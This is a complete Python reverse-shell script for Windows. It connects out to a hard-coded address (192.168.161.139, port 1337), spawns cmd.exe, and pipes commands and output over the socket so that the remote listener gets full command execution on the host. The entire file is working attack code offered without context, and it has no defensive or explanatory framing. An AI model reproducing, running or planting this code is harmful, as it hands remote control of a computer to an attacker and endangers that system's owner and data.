import socket
from subprocess import Popen, PIPE, STDOUT
from threading import Thread

def revS(ip, port):
    terminate = False

    def sendOutputData(socket, shell):
        while True:
            socket.send(shell.stdout.read(1).encode())

    try:
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect((ip,port))
        shell = Popen('cmd.exe', shell=True, bufsize=1, universal_newlines=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
    except Exception as e:
        print(e)
        return False

    consoleThread = Thread(target=sendOutputData, args=(skt, shell))
    consoleThread.start()

    while not terminate:
        try:
            received = skt.recv(1024)
            if received.decode().rstrip() == 'exit' or received == b'':
                terminate = True
                skt.close()
            shell.stdin.write(received.decode())
        except:
            skt.close()

revS('192.168.161.139', 1337)